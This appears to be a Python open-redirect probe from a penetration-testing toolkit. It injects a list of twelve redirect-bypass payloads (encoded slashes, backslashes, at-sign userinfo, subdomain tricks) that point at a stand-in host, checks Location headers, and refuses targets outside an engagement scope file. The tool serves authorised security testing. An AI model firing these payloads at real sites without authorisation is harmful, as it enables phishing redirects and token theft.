#!/usr/bin/env python3
"""redirect_probe.py - open-redirect bypass-ladder probe.

Substitutes a canonical ladder of payloads (references/open-redirect.md) into
the target URL - either a literal {PAYLOAD} placeholder in --target, or the
query parameter named by --param - and checks each response's Location header
for a host different from the target's. Prints every working payload.

Usage:
  python3 redirect_probe.py --scope-file scope.json \
      --target "http://target.example.com/go?next={PAYLOAD}"
  python3 redirect_probe.py --scope-file scope.json \
      --target "http://target.example.com/go" --param next

Exit codes: 0 = probe run completed (see verdicts); 2 = scope refusal;
1 = other error (bad args, transport failure).

Evidence expectation: keep request+response pairs for every OPEN payload as
evidence/p6-redirect-<host>-<n>.{req,resp}.txt; re-run once for D2.
"""

import argparse
import ipaddress
import json
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

USER_AGENT = "redjohn-pentestskills/redirect_probe/1.0"
EVIL_HOST = "evil.example"

# ---------------------------------------------------------------- scope guard


def host_allowed(target, scope):
    """Return (allowed, reason). Fail closed on any parse/DNS error."""
    try:
        parsed = urllib.parse.urlparse(target)
        if parsed.scheme not in ("http", "https"):
            return False, "scheme-not-http(s)"
        host = (parsed.hostname or "").lower().rstrip(".")
        if not host:
            return False, "no-host"
        try:
            addrs = {info[4][0].split("%", 1)[0] for info in socket.getaddrinfo(host, None)}
        except socket.gaierror:
            return False, "dns-unresolvable"
        if not addrs:
            return False, "dns-unresolvable"
        parsed_addrs = [ipaddress.ip_address(a) for a in addrs]
        nets = []
        for entry in scope.get("allowed", []):
            if entry.get("host", "").lower().rstrip(".") == host:
                return True, "host"
            if "cidr" in entry:
                nets.append(ipaddress.ip_network(entry["cidr"], strict=False))
        if nets and all(any(ip in net for net in nets) for ip in parsed_addrs):
            return True, "cidr"
        return False, "not-in-scope"
    except Exception as exc:  # fail closed on anything unexpected
        return False, "error:%s" % exc


def require_in_scope(target, scope_file):
    """Exit(2) unless target is inside the engagement scope."""
    with open(scope_file, "r", encoding="utf-8") as fh:
        scope = json.load(fh)
    ok, why = host_allowed(target, scope)
    if not ok:
        sys.stderr.write(
            "[scope-guard] refused %s (%s) engagement=%s\n"
            % (target, why, scope.get("engagement", "unnamed"))
        )
        sys.exit(2)
    return scope


# ---------------------------------------------------------------- payloads


def build_payloads(target_host):
    """Canonical bypass ladder (references/open-redirect.md)."""
    return [
        ("absolute-https", "https://%s/landed" % EVIL_HOST),
        ("protocol-relative", "//%s/landed" % EVIL_HOST),
        ("scheme-colon", "https:%s/landed" % EVIL_HOST),
        ("backslash", "\\/%s/landed" % EVIL_HOST),
        ("backslash-single", "/\\%s/landed" % EVIL_HOST),
        ("url-encoded-once", "%%2F%%2F%s%%2Flanded" % EVIL_HOST),
        ("url-encoded-backslash", "%%2F%%5C%s%%2Flanded" % EVIL_HOST),
        ("double-encoded", "%%252F%%252F%s%%252Flanded" % EVIL_HOST),
        ("at-sign-userinfo", "https://%s@%s/landed" % (target_host, EVIL_HOST)),
        ("at-sign-reversed", "https://%s@%s/landed" % (EVIL_HOST, target_host)),
        ("subdomain-trust", "https://%s.%s/landed" % (target_host, EVIL_HOST)),
        ("fragment-suffix", "https://%s/#%s" % (EVIL_HOST, target_host)),
    ]


def substitute(target, payload, param):
    """Return the request URL with payload substituted."""
    if "{PAYLOAD}" in target:
        return target.replace("{PAYLOAD}", payload)
    if param:
        parts = urllib.parse.urlsplit(target)
        query = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
        query = [(k, payload if k == param else v) for k, v in query]
        if not any(k == param for k, _v in query):
            query.append((param, payload))
        return urllib.parse.urlunsplit(
            (parts.scheme, parts.netloc, parts.path,
             urllib.parse.urlencode(query), parts.fragment))
    return target


def normalize_location(location):
    """Browsers treat backslashes as slashes in special schemes."""
    return location.replace("\\", "/")


def location_host(request_url, location):
    """Host the browser would land on (None when same-page/relative)."""
    if not location:
        return None
    resolved = urllib.parse.urljoin(request_url, normalize_location(location))
    return (urllib.parse.urlparse(resolved).hostname or "").lower()


def classify(target_host, request_url, location):
    """OPEN when Location leaves the target for a payload-controlled host."""
    if not location:
        return ("NO-REDIRECT", None)
    host = location_host(request_url, location)
    if not host or host == target_host:
        return ("INTERNAL", host)
    controlled = (host == EVIL_HOST) or host.endswith("." + EVIL_HOST)
    return ("OPEN", host) if controlled else ("EXTERNAL-UNCONTROLLED", host)


# ---------------------------------------------------------------- transport


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def fetch(url, timeout):
    opener = urllib.request.build_opener(_NoRedirect)
    req = urllib.request.Request(
        url, headers={"User-Agent": USER_AGENT, "Accept": "*/*"})
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.status, resp.headers.get("Location")
    except urllib.error.HTTPError as err:
        return err.code, err.headers.get("Location")


# ---------------------------------------------------------------- self-test


def _fake_getaddrinfo(host, port, *args, **kwargs):
    """Offline DNS stand-in: canned answers only, no network."""
    fake = {
        "example.com": ["93.184.216.34"],
        "target.example.com": ["203.0.113.10"],
        "localhost": ["127.0.0.1"],
        "127.0.0.1": ["127.0.0.1"],
        "10.0.0.5": ["10.0.0.5"],
    }
    if host in fake:
        return [
            (socket.AF_INET, socket.SOCK_STREAM, 6, "", (addr, port))
            for addr in fake[host]
        ]
    raise socket.gaierror(2, "offline fixture: unknown host")


def self_test():
    # --- mandatory scope-guard assertions (offline via fake DNS) ---
    original = socket.getaddrinfo
    socket.getaddrinfo = _fake_getaddrinfo
    try:
        local_scope = {"engagement": "selftest",
                       "allowed": [{"host": "localhost"}]}
        ok, why = host_allowed("https://example.com", local_scope)
        assert ok is False, "example.com must be refused, got %s" % why
        ok, why = host_allowed("http://10.0.0.5/", local_scope)
        assert ok is False and why == "not-in-scope", why
        loop_scope = {"engagement": "selftest",
                      "allowed": [{"host": "127.0.0.1"}]}
        ok, why = host_allowed("http://127.0.0.1:8080/", loop_scope)
        assert ok is True, "listed loopback must be allowed, got %s" % why
    finally:
        socket.getaddrinfo = original

    th = "target.example.com"
    req_url = "http://%s/go?next=x" % th

    # --- ladder construction ---
    payloads = build_payloads(th)
    assert len(payloads) >= 12, len(payloads)
    names = [n for n, _p in payloads]
    for expect in ("absolute-https", "protocol-relative", "scheme-colon",
                   "backslash", "url-encoded-once", "double-encoded",
                   "at-sign-userinfo", "subdomain-trust"):
        assert expect in names, expect
    assert ("subdomain-trust",
            "https://%s.evil.example/landed" % th) in payloads
    assert ("at-sign-userinfo",
            "https://%s@evil.example/landed" % th) in payloads

    # --- substitution ---
    url = substitute("http://%s/go?next={PAYLOAD}" % th,
                     "//evil.example/x", None)
    assert url == "http://%s/go?next=//evil.example/x" % th, url
    url = substitute("http://%s/go" % th, "https://evil.example/x", "next")
    assert "next=https%3A%2F%2Fevil.example%2Fx" in url, url
    url = substitute("http://%s/go?next=keep&z=1" % th, "//evil.example",
                     "next")
    assert "next=%2F%2Fevil.example" in url and "z=1" in url, url

    # --- location classification ---
    assert classify(th, req_url, None)[0] == "NO-REDIRECT"
    assert classify(th, req_url, "/other")[0] == "INTERNAL"
    assert classify(th, req_url, "https://%s/x" % th)[0] == "INTERNAL"
    verdict, host = classify(th, req_url, "//evil.example/landed")
    assert verdict == "OPEN" and host == EVIL_HOST, (verdict, host)
    verdict, host = classify(th, req_url, "\\/evil.example/landed")
    assert verdict == "OPEN" and host == EVIL_HOST, (verdict, host)
    verdict, host = classify(th, req_url, "https://%s@evil.example/x" % th)
    assert verdict == "OPEN" and host == EVIL_HOST, (verdict, host)
    verdict, host = classify(
        th, req_url, "https://%s.evil.example/x" % th)
    assert verdict == "OPEN" and host == "%s.evil.example" % th
    verdict, host = classify(th, req_url, "https://other.example/x")
    assert verdict == "EXTERNAL-UNCONTROLLED", (verdict, host)
    verdict, host = classify(th, req_url, "relative/path")
    assert verdict == "INTERNAL" and host == th, (verdict, host)

    print("[self-test] redirect_probe: guard(3) + ladder(12) + substitution "
          "+ classification fixtures passed")


# ---------------------------------------------------------------- cli


class _Parser(argparse.ArgumentParser):
    def error(self, message):
        self.print_usage(sys.stderr)
        sys.stderr.write("error: %s\n" % message)
        sys.exit(1)


def main():
    parser = _Parser(description="Open-redirect bypass-ladder probe.")
    parser.add_argument("--scope-file",
                        help="engagement scope JSON (or REDJOHN_SCOPE_FILE)")
    parser.add_argument("--target",
                        help="URL containing {PAYLOAD}, or a URL whose "
                             "query parameter is named by --param")
    parser.add_argument("--param",
                        help="query parameter to overwrite with each payload")
    parser.add_argument("--timeout", type=int, default=10,
                        help="per-request timeout seconds (default 10)")
    parser.add_argument("--delay", type=float, default=0.3,
                        help="seconds between probes (default 0.3)")
    parser.add_argument("--self-test", action="store_true",
                        help="run offline self-test (fixtures) and exit")
    args = parser.parse_args()

    if args.self_test:
        self_test()
        return

    scope_file = args.scope_file
    if not scope_file:
        import os
        scope_file = os.environ.get("REDJOHN_SCOPE_FILE")
    if not scope_file or not args.target:
        parser.error("--scope-file and --target are required")
    if "{PAYLOAD}" not in args.target and not args.param:
        parser.error("--target must contain {PAYLOAD} or --param must be "
                     "given")
    require_in_scope(args.target, scope_file)

    target_host = (urllib.parse.urlparse(args.target).hostname or "").lower()
    working = []
    for name, payload in build_payloads(target_host):
        url = substitute(args.target, payload, args.param)
        try:
            status, location = fetch(url, args.timeout)
        except (urllib.error.URLError, OSError) as err:
            print("[error] %-20s %s" % (name, err))
            continue
        verdict, host = classify(target_host, url, location)
        print("[%-24s] payload=%-55r -> %d %s Location=%r %s"
              % (name, payload, status, verdict, location,
                 ("host=%s" % host) if host else ""))
        if verdict == "OPEN":
            working.append((name, payload, location))
        time.sleep(args.delay)

    print("[summary] %d/%d payloads redirected to a different host; "
          "working: %s"
          % (len(working), len(build_payloads(target_host)),
             ", ".join(n for n, _p, _l in working) or "none"))
    for name, payload, location in working:
        print("[open] %s: %r -> %r" % (name, payload, location))
    print("[evidence] save each OPEN pair as "
          "evidence/p6-redirect-<host>-<n>.{req,resp}.txt; re-run once "
          "for D2; chain OAuth hops to 30-auth-access-control")


if __name__ == "__main__":
    main()
